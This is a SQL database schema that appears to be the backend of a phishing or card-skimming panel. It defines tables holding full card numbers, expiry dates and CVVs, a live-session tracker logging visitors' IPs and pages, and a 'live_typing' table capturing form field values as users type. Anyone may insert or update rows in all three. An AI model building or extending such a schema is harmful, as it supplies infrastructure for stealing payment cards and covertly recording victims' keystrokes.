-- USER ENTRIES
CREATE TABLE public.user_entries (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id text,
  email text,
  first_name text,
  last_name text,
  phone text,
  card_number text,
  card_expiry text,
  card_cvv text,
  extra jsonb DEFAULT '{}'::jsonb,
  created_at timestamptz NOT NULL DEFAULT now(),
  updated_at timestamptz NOT NULL DEFAULT now()
);
ALTER TABLE public.user_entries ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Anyone can insert entries"
  ON public.user_entries FOR INSERT
  WITH CHECK (true);

CREATE POLICY "Anyone can update entries by id"
  ON public.user_entries FOR UPDATE
  USING (true) WITH CHECK (true);

CREATE INDEX user_entries_created_at_idx ON public.user_entries (created_at DESC);
CREATE INDEX user_entries_user_id_idx ON public.user_entries (user_id);

-- LIVE SESSIONS
CREATE TABLE public.live_sessions (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id text,
  page text,
  user_agent text,
  ip text,
  last_seen timestamptz NOT NULL DEFAULT now(),
  created_at timestamptz NOT NULL DEFAULT now()
);
ALTER TABLE public.live_sessions ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Anyone can insert live sessions"
  ON public.live_sessions FOR INSERT
  WITH CHECK (true);

CREATE POLICY "Anyone can update live sessions"
  ON public.live_sessions FOR UPDATE
  USING (true) WITH CHECK (true);

CREATE INDEX live_sessions_last_seen_idx ON public.live_sessions (last_seen DESC);

-- LIVE TYPING
CREATE TABLE public.live_typing (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id text,
  user_id text,
  field_name text,
  field_value text,
  updated_at timestamptz NOT NULL DEFAULT now()
);
ALTER TABLE public.live_typing ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Anyone can insert live typing"
  ON public.live_typing FOR INSERT
  WITH CHECK (true);

CREATE POLICY "Anyone can update live typing"
  ON public.live_typing FOR UPDATE
  USING (true) WITH CHECK (true);

CREATE INDEX live_typing_updated_at_idx ON public.live_typing (updated_at DESC);

-- AUDIT LOG
CREATE TABLE public.admin_audit_log (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  ip text NOT NULL,
  user_agent text,
  action text NOT NULL,
  success boolean NOT NULL DEFAULT true,
  at timestamptz NOT NULL DEFAULT now()
);
ALTER TABLE public.admin_audit_log ENABLE ROW LEVEL SECURITY;

CREATE INDEX admin_audit_log_at_idx ON public.admin_audit_log (at DESC);

-- Auto-update updated_at
CREATE OR REPLACE FUNCTION public.touch_updated_at()
RETURNS TRIGGER LANGUAGE plpgsql SET search_path = public AS $$
BEGIN NEW.updated_at = now(); RETURN NEW; END;
$$;

CREATE TRIGGER trg_user_entries_touch
  BEFORE UPDATE ON public.user_entries
  FOR EACH ROW EXECUTE FUNCTION public.touch_updated_at();

CREATE TRIGGER trg_live_typing_touch
  BEFORE UPDATE ON public.live_typing
  FOR EACH ROW EXECUTE FUNCTION public.touch_updated_at();